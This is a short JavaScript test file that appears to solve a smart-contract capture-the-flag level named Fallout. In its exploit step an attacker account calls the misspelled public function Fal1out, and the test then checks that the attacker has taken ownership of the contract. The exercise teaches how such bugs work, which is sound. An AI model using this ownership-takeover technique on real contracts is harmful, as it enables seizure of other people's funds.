const { ether, expectRevert, expectEvent, } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const Fallout = contract.fromArtifact('Fallout');

const { expect } = require('chai');

describe('[Challenge] Fallback', function () {

  const [deployer, attacker, someUser, ...otherAccounts] = accounts;

  before(async function () {
    /** SETUP SCENARIO */
    this.fallout = await Fallout.new({ from: deployer });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.fallout.Fal1out({ from: attacker });

  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.fallout.owner()).eq(attacker);

  });
});
